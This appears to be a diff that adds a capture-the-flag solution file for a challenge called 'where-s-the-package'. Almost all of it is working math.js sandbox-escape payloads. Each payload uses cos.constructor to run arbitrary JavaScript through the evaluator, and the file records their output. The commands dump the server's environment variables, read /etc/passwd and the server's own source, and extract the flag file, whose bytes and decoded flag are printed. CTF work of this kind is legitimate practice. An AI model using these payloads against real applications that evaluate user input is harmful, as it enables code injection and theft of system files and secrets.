@@ -1,0 +1,54 @@
+https://capacitorset.github.io/mathjs/
+what is cos.constructor("return process.env")()
+LANG: "en_US.UTF-8"
+OLDPWD: "/"
+PATH: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+PWD: "/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad"
+REMOTE_HOST: "173.67.15.54"
+SHLVL: "1"
+_: "./start.sh"
+_SYSTEMCTL_SKIP_REDIRECT: "true"
+
+what is cos.constructor("buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer")()
+
+what is cos.constructor("buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad/index.js', 0, 0600), buffer, 0, 4096); return buffer")()
+
+what is cos.constructor("buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad/flag', 0, 0600), buffer, 0, 4096); return buffer")()
+
+what is cos.constructor("buffer = Buffer.allocUnsafe(64); process.binding('fs').read(process.binding('fs').open('/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad/flag', 0, 0600), buffer, 0, 64); return buffer.toString()")()
+
+65
+67
+73
+123
+50
+51
+51
+99
+48
+102
+49
+54
+53
+99
+50
+54
+97
+50
+48
+102
+98
+49
+49
+57
+99
+56
+99
+99
+99
+51
+50
+125
+10
+
+ACI{233c0f165c26a20fb119c8ccc32}
